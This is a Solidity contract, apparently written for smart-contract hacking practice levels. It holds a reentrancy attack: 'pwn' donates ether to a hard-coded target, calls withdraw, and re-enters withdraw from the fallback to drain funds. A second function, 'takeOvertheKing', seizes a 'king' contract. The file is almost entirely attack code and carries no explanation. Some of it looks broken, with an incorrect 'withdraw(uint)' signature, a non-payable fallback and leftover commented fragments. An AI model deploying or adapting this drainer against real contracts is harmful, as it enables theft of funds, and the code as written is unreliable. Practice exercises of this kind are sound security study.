// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract payload {
    uint256 value;

    function pwn() public payable {
        address payable target = 0x37Ca3e828cc2Fb51244119c65aF1269209e7f69B;
        bytes memory payload = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );
        (bool success, bytes memory returnData) = address(target).call{
            value: msg.value,
            gas: 400000
        }(payload);
        //require(success);
        //target.call.gas(1000000).value(msg.value)("donate", address(this));
        //reentrance.donate.value(msg.value)(address(this));
        value = msg.value;
        bytes memory payload2 = abi.encodeWithSignature("withdraw(uint)", 1);
        (bool success2, bytes memory returnData2) = address(target).call{
            gas: 400000
        }(payload2);
        //reentrance.withdraw(value);
        //(bool result, ) = target.call{value: msg.value}("");
    }

    function takeOvertheKing() public payable {
        address addr = 0x00d9D557dD5F87dF87B6bFC53eb3d783Fe2C59A7;
        // addr.call.value(1000000000000000000).gas(4000000)();

        (bool success, bytes memory test) = addr.call.value(msg.value)("");
        require(success, "Failed to transfer the funds, aborting.");
    }

    fallback() external {
        address payable target = 0x37Ca3e828cc2Fb51244119c65aF1269209e7f69B;
        bytes memory payload2 = abi.encodeWithSignature(
            "withdraw(uint)",
            value
        );
        (bool success2, bytes memory returnData2) = address(target).call(
            payload2
        );
    }
}